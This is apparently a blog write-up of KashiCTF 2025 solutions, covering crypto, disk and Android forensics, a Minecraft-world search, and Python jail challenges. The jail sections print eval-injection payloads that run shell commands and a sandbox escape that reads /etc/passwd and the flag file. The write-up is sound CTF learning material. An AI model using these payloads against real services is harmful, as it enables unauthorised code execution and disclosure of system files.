---
title: "KashiCTF"
description: "Migrated from Astro"
icon: "article"
date: "2025-02-25"
lastmod: "2025-02-25"
draft: false
toc: true
weight: 999
---

```bash
Author: Abu
```

Time to upgrade :/

{{< figure src="image.png" alt="image.png" >}}

Now it’s 37.5! Anyways we dropped from 30 to 19 after some incredible drama on discord. Since this CTF has container-based instances, there were dynamic flags, and long-story-short, people got caught red-handed sharing flags, but that was not the case for all of them, some good teams just had that one guy who dropped the shell. The organizing committer could’ve done a better job at managing things before the chaos erupted, but then again it’s the teams fault for cheating so it’s here and there, maybe having a central jury for CTFs that can handle stuff like these with appropriate evidence like logs, screen-shots, and so much more, cause these stuff are happening quite frequently nowadays. Just as things were getting heated, the 30 minute slow-mode comes in. I hope in no way I hurt someone, just want to put this stuff out there. Peace!

{{< figure src="image%201.png" alt="image.png" >}}

{{< figure src="image%202.png" alt="image.png" >}}

Lastly, more on the plugin the organizers used from an anonymous source, puts the nail in the coffin.

```python
i went through the repo
it's flagserver based for team unique
they definitely flag shared
🫠
there is only one flag generated for one challenge for one team and stored, 
it curls to the flag server and gets it. There can't be some race condition if it's 
not generated only. How will they get the parameters wrong or the curl will change 
your request. though the extension isn't perfect. there ain't no way it gives other 
teams flags on it. possible they cheated
```

## Cryptography

### **Lost Frequencies**

Zeroes, ones, dots and dashes

Data streams in bright flashes

`111 0000 10 111 1000 00 10 01 010 1011 11 111 010 000 0`

**NOTE**: Wrap the capitalized flag in `KashiCTF{}`

The given binary sequence appears to be Morse code in binary format, converted `0`to `.` and `1` to `-`.

[CyberChef](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Regex','string':'1'%7D,'-',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'0'%7D,'.',true,false,true,false)From_Morse_Code('Space','Line%20feed')&input=MTExIDAwMDAgMTAgMTExIDEwMDAgMDAgMTAgMDEgMDEwIDEwMTEgMTEgMTExIDAxMCAwMDAgMA)

`--- .... -. --- -... .. -. .- .-. -.-- -- --- .-. ... .` it decodes to `OHNOBINARYMORSE`

Flag: `KashiCTF{OHNOBINARYMORSE}`

### **Key Exchange**

Someone wants to send you a message. But they want something from you first.

Given: `server.py` + `instance`

```python
from redacted import EllipticCurve, FLAG, EXIT
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import hashlib
import random
import json
import os

def encrypt_flag(shared_secret: int):
    sha1 = hashlib.sha1()
    sha1.update(str(shared_secret).encode("ascii"))
    key = sha1.digest()[:16]
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(FLAG, 16))
    data = {}
    data["iv"] = iv.hex()
    data["ciphertext"] = ciphertext.hex()
    return json.dumps(data)

#Curve Parameters (NIST P-384)
p = 39402006196394479212279040100143613805079739270465446667948293404245721771496870329047266088258938001861606973112319
a = -3
b = 27580193559959705877849011840389048093056905856361568521428707301988689241309860865136260764883745107765439761230575
E = EllipticCurve(p,a,b)
G = E.point(26247035095799689268623156744566981891852923491109213387815615900925518854738050089022388053975719786650872476732087,8325710961489029985546751289520108179287853048861315594709205902480503199884419224438643760392947333078086511627871)

n_A = random.randint(2, p-1)
P_A = n_A * G

print(f"\nReceived from Weierstrass:")
print(f"   Here are the curve parameters (NIST P-384)")
print(f"   {p = }")
print(f"   {a = }")
print(f"   {b = }")
print(f"   And my Public Key: {P_A}")

print(f"\nSend to Weierstrass:")
P_B_x = int(input("   Public Key x-coord: "))
P_B_y = int(input("   Public Key y-coord: "))

try:
    P_B = E.point(P_B_x, P_B_y)
except:
    EXIT()

S = n_A * P_B

print(f"\nReceived from Weierstrass:")
print(f"   Message: {encrypt_flag(S.x)}")
```
Props to `vardar` for solving this!

```python
import json
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

Given shared secret
shared_secret = $shared key from server$

Encrypted data
encrypted_json = '''{
    "iv": "f13be6bd83094fa6a6e7c97b0c8bd05d",
    "ciphertext": "7be17abaf5e13f1dd7bffa9e8302229cb785507bc84af78acc0faae2a26de3bf45941303b532ea89104b26d4aae28fcbe8a40b3bad2c98afcb5f31445ffb19f847dbf35c16e4db1c5f83341ade3d9e0b1a9cc60c83ad9de8107b4cc534377e57"
}'''

Convert shared secret to string and hash it
secret_key = hashlib.sha1(str(shared_secret).encode()).digest()[:16]

Parse the JSON encrypted data
data = json.loads(encrypted_json)
iv = bytes.fromhex(data["iv"])
ciphertext = bytes.fromhex(data["ciphertext"])

Decrypt data
aes_cipher = AES.new(secret_key, AES.MODE_CBC, iv)
decrypted_data = unpad(aes_cipher.decrypt(ciphertext), AES.block_size)

Print the flag
print("Decrypted Flag:", decrypted_data.decode())
```

Which gave the output, `NaeusGRX{L_r3H3Nv3h_kq_Sun1Vm_O3w_4fg_4lx_1_t0d_a4q_lk1s_X0hcc_Dd4J_BK1Ifjzs}` , then `vignere` cipher with key `DamnKeys` as given hint to get the flag.

Flag: `KashiCTF{I_r3V3Al3d_my_Pub1Ic_K3y_4nd_4ll_1_g0t_w4s_th1s_L0usy_Fl4g_BY1Ivfba}`

### MMDLX

Although I know only a fraction of their history, but I think Romans have done many weird things in life. But this is a very basic challenge, right?

Given: `MMDLX.txt`

We see a huge file with potentially base-64? but it doesn’t decode right away. Looking at the challenge title, it corresponds to `2560` in decimal, so why not decode it 2560 times? That was a mistake.

- **Apply ROT3 once**
- **Recursively decode Base64** until `"KashiCTF"` appears in the decoded text.

```python
from base64 import b64decode

def caesar(text, shift):
    tab1 = 'abcdefghijklmnopqrstuvwxyz'
    tab2 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(
        [tab1[(tab1.index(i) + shift) % 26] if i in tab1 else
         tab2[(tab2.index(i) + shift) % 26] if i in tab2 else i
         for i in text]
    ).encode()

with open('MMDLX.txt', 'r') as file:
    data = file.read()

data = caesar(data, 3)

count = 0
while b'KashiCTF' not in data:
    try:
        data = b64decode(data)
        count += 1
    except Exception as e:
        print(f"Decoding error after {count} cycles: {e}")
        break

print(f"Flag: {data.decode(errors='ignore')}")
print(f"Cycles: {count}")

```

Output:

```python
Flag: KashiCTF{w31rd_numb3r5_4nd_c1ph3r5}
Cycles: 40
```

## Forensics

### **Memories Bring Back**

A collection of images, a digital time capsule—preserved in this file. But is every picture really just a picture? A photographer once said, “Every image tells a story, but some stories are meant to stay hidden.” Maybe it’s time to inspect the unseen and find what’s been left behind.

[file link](https://1drv.ms/u/c/dfdcc49b521e7a98/ERmqsxL1d7hMogyPb-5acNsBsBeZRLdgTSW98j5oJShi5Q?e=7oNUX4)

```bash
└─$ file chall
chall: DOS/MBR boot sector MS-MBR Windows 7 english at offset 0x163 "Invalid partition table" at offset 0x17b "Error loading operating system" at offset 0x19a "Missing operating system", disk signature 0x5032578b; partition 1 : ID=0x7, start-CHS (0x0,2,3), end-CHS (0x7e,254,63), startsector 128, 2041856 sectors
```

At first I did `foremost` and tried mounting it, all was good, and that took we down the rabbit-hole of nothingness, decoding morse file that spit out `Ihsan` ? and nothing came out of it.

{{< figure src="image%203.png" alt="image.png" >}}

Then opened it up with FTK Imager [Add Evidence Item → Image File → Finish], expanding the root partition, we see four images with `ADS`[Alternate Data Streams] embedded within them.

{{< figure src="image%204.png" alt="image.png" >}}

<aside>
💡New Technology File System (NTFS) is the default file system for Windows 11 as well as many others. NTFS harbors a concealed feature known as an **Alternate Data Streams** (ADS). These streams provide a covert means of hiding data within files, which creates challenges and opportunities for digital forensic investigators.

</aside>

{{< figure src="image%205.png" alt="image.png" >}}

Flag: `KashiCTF{DF1R_g03555_Brrrr}`

**Epic-Fail:**

```bash
┌──(omni)(abu㉿Abuntu)-[/mnt/c/Main/CyberSec/KashiCTF/forensics/3]
└─$ strings chall | grep KashiCTF
KashiCTF{Fake_Flag}
KashiCTF{Fake_Flag}
KashiCTF{Fake_Flag}
KashiCTF{DF1R_g03555_Brrrr}
```

### Corruption

A corrupt drive I see...

Attachments: [image.iso](https://drive.google.com/file/d/1gHY5DOmUcZvfrLr-EpQWJfR3oiVCsYtD/view?usp=sharing)

Just Strings!

```bash
└─$ strings image.iso  | grep Kashi
KashiCTF{FSCK_mE_B1T_by_b1t_Byt3_by_byT3}
```

Tried a bit to solve it with the intended method, no luck.

### **Restaurant**

I just asked for my favorite pasta and they gave me this. Are these guys STUPID? Maybe in the end they may give me something real. (Wrap the text in `KashiCTF{}`)

Pretty sure, we all tried the generic strings, `binwalk` route which leads no where, patience! [hard to have nowadays]

Checking the extraneous bytes of the image file, we see a suspicious sequence.

```bash
└─$ xxd pasta.jpg | tail -n 4
0000b750: 28bf ffd9 baab aaab bbaa baab abba baba  (...............
0000b760: aaab aaba aaaa abaa baaa aaab aaaa aaaa  ................
0000b770: baba abab aaba baab abab abba aaab aabb  ................
0000b780: abab baba baab abaa aabb aaaa bba0       ..............
```

Turns out it was `Bacon`.

{{< figure src="image%206.png" alt="image.png" >}}

Flag: `KashiCTF{THEYWEREREALLLLYCOOKING}`

### **Look at Me**

There is something wrong with him.. What can it be??

{{< figure src="Look_at_me.jpg" alt="p4" >}}

Spend a while on this, again trying the generic route. Then looking at the image with purpose [can’t be explained with words LOL], I looked this up on Google.

{{< figure src="image%207.png" alt="image.png" >}}

Everything pointed to `SilentEye`, I’ve been doing a pretty steady collection of obscure CTF tools but still people come up with newer ones.

[CTF Inventory](https://abuctf.github.io/posts/CTFInventory/)

You can download SilentEye from the given link [32-bit still works].

[SilentEye - Steganography is yours](https://achorein.github.io/silenteye/)

{{< figure src="image%208.png" alt="image.png" >}}

Flag: `KashiCTF{K33p_1t_re4l}`

### **Do Not Redeem #1**

Uh oh, we're in trouble again. Kitler's Amazon Pay wallet got emptied by some scammer. Can you figure out the OTP sent to kitler right before that happened, as well as the time (unix timestamp in milliseconds) at which kitler received that OTP?

Flag format: `KashiCTF{OTP_TIMESTAMP}`, i.e. `KashiCTF{XXXXXX_XXXXXXXXXXXXX}`

This challenge was bit of cursed with the sharing platform failing every time. Then came GitHub.

At first, when we clone the repository, git was just pulling the checksums of the large `tar` files, so we needed to initialize LFS in order to install the files.

{{< figure src="image%209.png" alt="image.png" >}}

{{< figure src="image%2010.png" alt="image.png" >}}

After unpacking and all that, we looking for the OTP, so after some research on android forensics and GPT, came across this `mmssms.db` SQLite DB.

[https://hackers-arise.net/2023/11/30/digital-forensics-part-10-mobile-forensics-android/](https://hackers-arise.net/2023/11/30/digital-forensics-part-10-mobile-forensics-android/)

```bash
└─$ sqlite3 extracted/data/data/com.android.providers.telephony/databases/mmssms.db "SELECT address, date, body FROM sms ORDER BY date DESC;"
AX-AMZNIN|1740251865569|Order placed with order id: PO3663460903896.

Thank you for choosing Amazon as your shopping destination.

Remaining Amazon Pay balance: INR0.69
57575022|1740251608654|839216 is your Amazon OTP. Don't share it with anyone.

```

Alternatively, we can solve it quite easily with `Aleapp` .

[Aleapp](https://github.com/abrignoni/ALEAPP)

{{< figure src="image%2011.png" alt="image.png" >}}

Flag: `KashiCTF{839216_1740251608654}`

### **Do Not Redeem #2**

Kitler says he didn't request that OTP, neither did he read or share it. So it must be the scammer at play. Can you figure out the package name of the application that the suspected scammer used to infiltrate Kitler? Wrap your answer within `KashiCTF{` and `}`.

Flag format: `KashiCTF{com.example.pacage.name}`

Download `kitler's-phone.tar.gz` : Use the same file as in the challenge description of [forensics/Do Not Redeem #1](https://kashictf.iitbhucybersec.in/challenges#Do%20Not%20Redeem%20#1-28)

{{< figure src="image%2012.png" alt="image.png" >}}

After the agonizingly slow upload to `Aleapp`, since we looking for package names, we onto App Icons, and notice that one particular one does not match with the given name, `com.google.calender.android` and it is indeed the malicious package.

{{< figure src="image%2013.png" alt="image.png" >}}

Flag: `KashiCTF{com.google.android.calendar}`

### Stego Gambit

Do you dare to accept the Stego Gambit? I know you can find the checkmate but the flag!!

{{< figure src="chall.jpg" alt="p4" >}}

So in this challenge, after some thought over the description, it’s pretty clear (at least to me) that we’ll need a check-mate sequence and input it to `steghide` and I straight away went over brute forcing the sequence with `stegseek` .

```bash
from itertools import product

first_moves = ["Be4", "Bf3", "Bg2", "Bh1", "be4", "bf3", "bg2", "bh1"]

fixed_moves = ["Kxa2", "Qd2+"]
fixed_moves_variants = [[move, move.lower()] for move in fixed_moves]

passwords = []
for first_move in first_moves:
    for variations in product(*fixed_moves_variants):
        password = f"{first_move}_{variations[0]}_{variations[1]}"
        passwords.append(password)

with open("passwords.txt", "w") as f:
    f.write("\n".join(passwords))
```

So, it’s a pretty simple mate-in-2 sequence. But the twist came in the notation, thankfully someone cleared it was `algebraic notation`. [note the check symbol and all that details matter here]

Even then, after some trial and error, we reached this `Bh1Kxa2_Qg2#`.

[Algebraic notation (chess)](https://en.wikipedia.org/wiki/Algebraic_notation_(chess))

```bash
└─$ steghide extract -sf chall.jpg
Enter passphrase: Bh1Kxa2_Qg2#
wrote extracted data to "flag.txt".

└─$ cat flag.txt
KashiCTF{573g0_g4m617_4cc3p73d}
```

Flag: `KashiCTF{573g0_g4m617_4cc3p73d}`

### **Do Not Redeem #3**

Too bad, Kitler did get scammed. Kitler met a lot of people recently, and is having a hard time trying to figure out who exactly the scammer could've been. Can you figure out the scammer's username (on the platform they met), and the link through which the scammer sent Kitler the scam app. Answer according to the below flag format:

Flag format: `KashiCTF{username_link}`, e.g. `KashiCTF{savsch_https://www.youtu.be/dQw4w9WgXcQ}`

Now pretty much only 10 teams were able to solve this excluding us, so digging in after the event, the username part rings suspicion on discord.

`data/data/com.discord/cache/http-cache`

Just a script to organize things in the discord cache based on their file types.

```python
#!/bin/bash

mkdir -p text images gifs compressed jsons unknown

for file in *; do
    if [[ -f "$file" ]]; then
        case "$(file --mime-type -b "$file")" in
            text/plain)
                mv "$file" text/;;
            image/webp)
                mv "$file" images/;;
            image/png)
                mv "$file" images/;;
            image/gif)
                mv "$file" gifs/;;
            application/gzip)
                mv "$file" compressed/;;
            application/json)
                mv "$file" jsons/;;
            *)
                mv "$file" unknown/;;
        esac
    fi
done

echo "Files sorted successfully!"
```

Then looking over images, gifs, JSON, and others found nothing interesting, then came the compressed directory, and looking at them after uncompressing them, we see chat logs, Bingo!

After some scripting-fu, we sort things in order and time to read. And looking for links, we hit a suspicious one real quick.

{{< figure src="image%2014.png" alt="image.png" >}}

Flag: `KashiCTF{savsch_https://we.tl/t-Ku8Le7js}`

### **Do Not Redeem #4**

The scammer wrote a poem in a game they played with Kitler. They also shared a redeem voucher with Kitler. Can you find out what the voucher code was? Wrap your answer within `KashiCTF{` and `}`

Flag Format: `KashiCTF{VoucherCode}`

Note: solving the previous part will be of great help in solving this one.

Almost instantly found the voucher with strings but wanted to take the harder route, so here’s me having a crack at playing Minecraft with zero experience. I knew something about importing worlds from past challenges, so it was not like going in with a blindfold. We have the target at `data/data/com.mojang.minecraftpe/games/com.mojang/minecraftWorlds`, which can be found after research and understanding that Minecraft was the only installed game in the home, and the challenge heavily hinted on a game being involved. We find the `0RjavQ==` directory containing the world files. 

```bash
├── minecraftWorlds
│   └── 0RjavQ==
│       ├── db
│       │   ├── 086972.ldb
│       │   ├── 086973.ldb
│       │   ├── 086976.log
│       │   ├── 086979.ldb
│       │   ├── 086980.ldb
│       │   ├── 086981.ldb
│       │   ├── 086982.ldb
│       │   ├── CURRENT
│       │   └── MANIFEST-086965
│       ├── level.dat
│       ├── level.dat_old
│       ├── levelname.txt
│       └── world_icon.jpeg
```

But before anything, this one is a bedrock edition, which can we found out from the discord chats from the previous challenge.

```bash
 "Nice, I play bedrock too"
 "It's the name I signed that poem with, the one I kept at my room in your beacon tower"
 "I wrote a poem, mind checking out?",
 "The view from here is downright fantastic",
 "Yup, it's all yours",
 "Can I keep the top floor of the tower for myself, then?",
 "Aah that didn't cross my mind. Can you help me build it?",
 "A nether elevator, then?",
 "I considered it, but it destroys the look",
 "it's a pain to climb up all the scaffolding, may I suggest a bubble column?",
 "this beacon tower is kinda cool"
```

In Minecraft PE, there are predominantly two editions, one is java, which is the more wide-spread pc game, and bedrock is for mobile gaming. Now, that we understand the editions of Minecraft, let’s look at how to actually play the game, long road ahead!

At first, I tried to play it with bedrock as it is, for this we can either use an emulator like `Android Studio` or `BlueStacks` , or just play it in your phone LOL. I tried both methods. Went to play store to find out that Minecraft costs 29, and just downloaded the trial version, and opening it.

{{< figure src="new1.png" alt="p4" >}}

We see an option to import world file into the `/android/data/com.mojang.minecrafttrialpe/files/games/com/mojang.trial/minecraftWorlds`, but android does not allow you to access the anything in the `/android` directory besides the media one, so I had to install two applications, `X-plore` and `Shizuka` . So `X-plore` is the file manager and `Shizuku` ****is an open-source app for serving multiple apps that require root/adb. After some much time consuming system configurations, we import the files into the specified directory.

{{< figure src="new2.png" alt="p4" >}}

But the game throws an error each time sadly, I think the mistake I did here is the method in which I imported the files, more details later.

{{< figure src="new3.png" alt="p4" >}}

No success with `BlueStacks` as well. Note: It only even works on `Pie 64-bit` instances.

{{< figure src="new4.png" alt="image.png" >}}

{{< figure src="new3-1.png" alt="p4" >}}

Also, as for android studio, my laptop is too low-spec to even emulate the adb devices.

<aside>
💡

Android Debug Bridge (adb) is a versatile command-line tool that lets you communicate with a device. The adb command facilitates a variety of device actions.

</aside>

`WARNING      | Your GPU 'Intel(R) UHD Graphics 620' has driver version 1.3.215, and cannot support Vulkan properly. Please try updating your GPU Drivers.`

Spend a bunch debugging android studio errors as well. While doing all the debugging, I just noticed something wild!

{{< figure src="new5.png" alt="image.png" >}}

Threw that into the bin.

Now, we have the other bunch of techniques, that is the convert bedrock version to java, to run it in the machine. Here’s me trying them all out.

[Amulet Editor](https://www.amuletmc.com/)

{{< figure src="new6.png" alt="image.png" >}}

Well this can only allow you to 3D edit the game, and not play, and can also do conversions to other editions of Minecraft, like Java, but it kinda hung there for a long time as you can see below. By the way, I’m using `TLauncher` to run a version of Minecraft, it’s pretty convenient and free as well.

{{< figure src="new7.png" alt="p4" >}}

Then came `Chuncker`.

[Chunker](https://www.chunker.app/)

{{< figure src="new8.png" alt="p4" >}}

Which ended in another dead-end.

{{< figure src="new9.png" alt="image.png" >}}

Next up, we have `je2be`, a web client to help us convert, and tell you what this actually worked!

[je2be-web](https://je2be.app/)

{{< figure src="new10.png" alt="image.png" >}}

Finally, it’s been almost a day of debugging, and I finally made it work. At first, used `je2be` to convert the bedrock to java, then through `TLauncher`, created a sample world called Kashi, then saved it, and these are usually stored in,  

`C:\Users\YourUsername\AppData\Roaming\.minecraft\saves\` after which I extracted the contents of the zip output from `je2be` into a new sub-directory in the saves directory, finally copying the entire content into the Kashi directory.

```bash
cp -r /mnt/c/Users/abura/AppData/Roaming/.minecraft/saves/ExtractedWorld/* /mnt/c/Users/abura/AppData/Roaming/.minecraft/saves/Kashi/
```

{{< figure src="new11.png" alt="image.png" >}}

Opened up `TLauncher` and boom, there it was, it’s the first world under `ExtractedWorld`, and I was finally in the game!

{{< figure src="new12.png" alt="image.png" >}}

Funny thing, I moved one square and immediately fell to my death LOL.

{{< figure src="new13.png" alt="p4" >}}

I wandered asking people around about how do I go about doing this, while later this dude messages and possibly ruined my day.

```bash
[3:49 PM, 2/28/2025] SHL: I told you it works
[3:49 PM, 2/28/2025] Abu: phone ah
[3:49 PM, 2/28/2025] SHL: Took 2mins
[3:49 PM, 2/28/2025] SHL: Yeah
[3:49 PM, 2/28/2025] Abu: howww
[3:50 PM, 2/28/2025] SHL: Converted that file to zip
[3:50 PM, 2/28/2025] SHL: Unzipped and got world file
[3:50 PM, 2/28/2025] SHL: Plugged phone to laptop (finally found a cable)
[3:50 PM, 2/28/2025] SHL: Added it to here
[3:50 PM, 2/28/2025] SHL: And done
```

I feel so dumb right now. Then after discovered `NBTExplorer`.

[NBTExplorer - NBT Editor for Windows and Mac - Minecraft Tools - Mapping and Modding: Java Edition - Minecraft Forum - Minecraft Forum](https://www.minecraftforum.net/forums/mapping-and-modding-java-edition/minecraft-tools/1262665-nbtexplorer-nbt-editor-for-windows-and-mac)

{{< figure src="new14.png" alt="image.png" >}}

But nothing of value here as well. After having no clue with Minecraft world, `SHL` joined the hunt, and immediately made progress, as hinted in the chat in Discord.

`SHL` found the beacon tower and and found the book by the lantern as told, surprisingly I didn’t see the contents of the book, but we see the `voucher`[Author] after picking up the book and placing it in the inventory, but without appropriate hints and leads, spotting this would be next to impossible. Now, things would be sour if I left things as is right, here’s a brief tutorial on how I learned to solve this, first of all you can issue commands in Minecraft world with `/`, you can start off with `/help`and so on, so we first enable creative mode, by `/gamemode creative` and click the letter `e`, which opens by a dialog box, which looks like this.

{{< figure src="new15.png" alt="p4" >}}

Now, go to tab with compass icon, and search for `Elytra`.

{{< figure src="new16.png" alt="image.png" >}}

and next for rockets, both of times, drag the items to the bottom row, which let’s you equip things, then next up, go to survival inventory [treasure box below the `X`].

{{< figure src="new17.png" alt="p4" >}}

Drag and drop `Elytra` into the armor plate section, this equips the wings, next hit `escape` to go back to the game, to fly walk in a direction, and double tap to activate wings, once you get the hang of this, use the scroll button in mouse to equip the rocket, then do the same to activate wings and press right in the mouse to fire the rockets, and that’s how you fly!

{{< figure src="new18.png" alt="p4" >}}

Notice: before you actually fly, set the game mode back to survival just to tidy things up.

Fly around and spot the beacon tower, land on the bottom, enter through the door, and hold space to jump to the highest floor, where the book lies.

{{< figure src="new19.png" alt="p4" >}}

Flag: `KashiCTF{KedA5hKr0f7}`

## **Miscellaneous**

### **Easy Jail**

I made this calculator. I have a feeling that it's not safe :(

Given: `Instance` + `challenge.zip`

```python
def calc(op):
        try :
                res = eval(op)
        except :
                return print("Wrong operation")
        return print(f"{op} --> {res}")

def main():
        while True :
                inp = input(">> ")
                calc(inp
```

A very obvious `eval()` has been given, and objective is inject commands to read the flag.

```python
>> __import__('os').system('cat /etc/passwd')
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologi
```

Payload: **`import**('os').system('cat /flag.txt')`

### **Easy Jail 2**

I made a completely secure calculator this time.

Given: same as above

Upgraded jail here, just need to bypass the filters in order to inject.

```python
└─$ nc kashictf.iitbhucybersec.in 59824
           _            _       _
          | |          | |     | |
  ___ __ _| | ___ _   _| | __ _| |_ ___  _ __
 / __/ _` | |/ __| | | | |/ _` | __/ _ \| '__|
| (_| (_| | | (__| |_| | | (_| | || (_) | |
 \___\__,_|_|\___|\__,_|_|\__,_|\__\___/|_|
>> print("".__class__.__mro__[1].__subclasses__()[129].__subclasses__()[2].__subclasses__()[0]("/etc/passwd").read())
b'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\
nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:
4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:
```

This exploit leverages Python’s introspection capabilities to access and read system files, bypassing common security restrictions.

In Python, everything is an object, and objects belong to classes. The `""` (empty string) is an instance of the `str` class, which is a subclass of the `object` class. The `__mro__` (Method Resolution Order) attribute of `str` provides a tuple showing the inheritance hierarchy, with `object` being at index `[1]`.

From `object`, we can access all its subclasses using `__subclasses__()`, which returns a list of every class that directly inherits from `object`. This list contains many internal Python classes, including `io.FileIO`, which can be used to read files.

By navigating through these subclasses, the payload locates the `io.FileIO` class and instantiates it with `"/etc/passwd"` as an argument, which is a common UNIX file storing user account information. Calling `.read()` on this instance outputs the file's contents, revealing juicy details.

Payload: `print("".__class__.__mro__[1].__subclasses__()[129].__subclasses__()[2].__subclasses__()[0]("/flag.txt").read())`

### Game 2 - Wait

We made a game.

Link: 

[driveLink](https://drive.google.com/file/d/1GDYmOiW54pPLFxfQaBOOS5IPEAoplFPy/view?usp=drive_link)

Props to `vardar` for solve this challenge!

```python
#kakashi

import pygame
import re

# Initialize Pygame
pygame.init()

# Constants
WIDTH, HEIGHT = 1200, 600
BACKGROUND_COLOR = (0, 0, 0)  # Black background
PIXEL_COLOR = (255, 255, 255)  # White pixels
PIXEL_SIZE = 5  # Size of each pixel

# Create the Pygame window
screen = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption("Flag Reveal")

# Paste the raw input below as a string
raw_input = """pos = [Vector2(232,128),Vector2(232,80),Vector2(232,96),Vector2(232,112),Vector2(232,144),Vector2(232,160),Vector2(232,176),Vector2(248,112),Vector2(265,103),Vector2(281,87),Vector2(248,128),Vector2(264,144),Vector2(272,160),Vector2(280,176),Vector2(343,120),Vector2(327,128),Vector2(319,144),Vector2(319,160),Vector2(327,176),Vector2(343,176),Vector2(359,176),Vector2(367,160),Vector2(367,144),Vector2(367,128),Vector2(359,120),Vector2(375,168),Vector2(391,176),Vector2(343,120),Vector2(327,128),Vector2(327,176),Vector2(343,176),Vector2(359,176),Vector2(367,160),Vector2(367,144),Vector2(367,128),Vector2(359,120),Vector2(375,168),Vector2(391,176),Vector2(335,376),Vector2(335,360),Vector2(335,344),Vector2(335,328),Vector2(335,312),Vector2(335,296),Vector2(351,328),Vector2(367,320),Vector2(375,304),Vector2(375,376),Vector2(415,376),Vector2(415,360),Vector2(415,344),Vector2(415,328),Vector2(415,312),Vector2(415,296),Vector2(431,312),Vector2(447,304),Vector2(463,296),Vector2(367,360),Vector2(351,344),Vector2(471,104),Vector2(455,104),Vector2(439,104),Vector2(423,112),Vector2(423,128),Vector2(423,144),Vector2(439,144),Vector2(455,144),Vector2(471,144),Vector2(471,160),Vector2(463,177),Vector2(455,177),Vector2(439,177),Vector2(423,177),Vector2(513,89),Vector2(513,121),Vector2(513,137),Vector2(513,153),Vector2(513,169),Vector2(513,177),Vector2(513,105),Vector2(529,145),Vector2(545,145),Vector2(553,153),Vector2(553,169),Vector2(553,177),Vector2(185,291),Vector2(185,323),Vector2(185,339),Vector2(185,355),Vector2(185,371),Vector2(185,379),Vector2(185,307),Vector2(201,347),Vector2(217,347),Vector2(225,355),Vector2(225,371),Vector2(225,379),Vector2(977,291),Vector2(977,323),Vector2(977,339),Vector2(977,355),Vector2(977,371),Vector2(977,379),Vector2(977,307),Vector2(993,347),Vector2(1009,347),Vector2(1017,355),Vector2(1017,371),Vector2(1017,379),Vector2(593,177),Vector2(593,161),Vector2(593,145),Vector2(593,129),Vector2(593,89),Vector2(693,84),Vector2(677,84),Vector2(661,84),Vector2(645,84),Vector2(629,84),Vector2(629,100),Vector2(629,116),Vector2(629,132),Vector2(629,148),Vector2(629,164),Vector2(629,180),Vector2(645,180),Vector2(661,180),Vector2(677,180),Vector2(693,180),Vector2(149,284),Vector2(133,284),Vector2(117,284),Vector2(101,284),Vector2(85,284),Vector2(85,300),Vector2(85,316),Vector2(85,332),Vector2(85,348),Vector2(85,364),Vector2(85,380),Vector2(101,380),Vector2(117,380),Vector2(133,380),Vector2(149,380),Vector2(733,84),Vector2(749,84),Vector2(765,84),Vector2(781,84),Vector2(797,84),Vector2(765,100),Vector2(765,116),Vector2(765,132),Vector2(765,148),Vector2(765,164),Vector2(765,180),Vector2(853,180),Vector2(853,164),Vector2(853,148),Vector2(853,132),Vector2(853,116),Vector2(853,100),Vector2(853,84),Vector2(869,84),Vector2(885,84),Vector2(901,84),Vector2(917,84),Vector2(869,124),Vector2(885,124),Vector2(901,124),Vector2(45,260),Vector2(29,276),Vector2(37,292),Vector2(37,308),Vector2(29,324),Vector2(13,340),Vector2(29,353),Vector2(37,369),Vector2(37,385),Vector2(29,400),Vector2(45,416),Vector2(45,416),Vector2(1062,257),Vector2(1076,270),Vector2(1068,286),Vector2(1068,302),Vector2(1076,318),Vector2(1092,334),Vector2(1077,350),Vector2(1069,366),Vector2(1069,382),Vector2(1077,398),Vector2(1061,414),Vector2(29,276),Vector2(37,292),Vector2(37,308),Vector2(29,324),Vector2(13,340),Vector2(29,353),Vector2(37,369),Vector2(37,385),Vector2(29,400),Vector2(45,416),Vector2(45,416),Vector2(301,336),Vector2(301,352),Vector2(301,368),Vector2(301,376),Vector2(301,320),Vector2(301,304),Vector2(285,344),Vector2(269,344),Vector2(253,344),Vector2(261,336),Vector2(269,320),Vector2(285,304),Vector2(301,288),Vector2(525,336),Vector2(525,352),Vector2(525,368),Vector2(525,376),Vector2(565,376),Vector2(581,376),Vector2(597,376),Vector2(613,376),Vector2(629,376),Vector2(717,376),Vector2(701,360),Vector2(693,344),Vector2(685,328),Vector2(677,312),Vector2(669,296),Vector2(661,280),Vector2(733,362),Vector2(741,346),Vector2(749,330),Vector2(757,314),Vector2(765,298),Vector2(773,282),Vector2(797,322),Vector2(805,338),Vector2(821,354),Vector2(837,346),Vector2(845,330),Vector2(851,318),Vector2(819,366),Vector2(811,382),Vector2(891,318),Vector2(891,334),Vector2(891,350),Vector2(891,366),Vector2(899,382),Vector2(915,382),Vector2(931,382),Vector2(939,374),Vector2(939,358),Vector2(939,342),Vector2(939,326),Vector2(939,318),Vector2(525,320),Vector2(525,304),Vector2(509,344),Vector2(493,344),Vector2(477,344),Vector2(485,336),Vector2(493,320),Vector2(509,304),Vector2(525,288)]"""

# Parse Vector2 data
pos = re.findall(r"Vector2\((\d+),(\d+)\)", raw_input)
positions = [(int(x), int(y)) for x, y in pos]

# Main loop
running = True
while running:
    screen.fill(BACKGROUND_COLOR)

    # Draw pixels at final positions
    for x, y in positions:
        pygame.draw.rect(screen, PIXEL_COLOR, (x, y, PIXEL_SIZE, PIXEL_SIZE))

    # Update the display
    pygame.display.flip()

    # Event handling
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False

# Quit Pygame
pygame.quit()
```

### **SNOWy Evening**

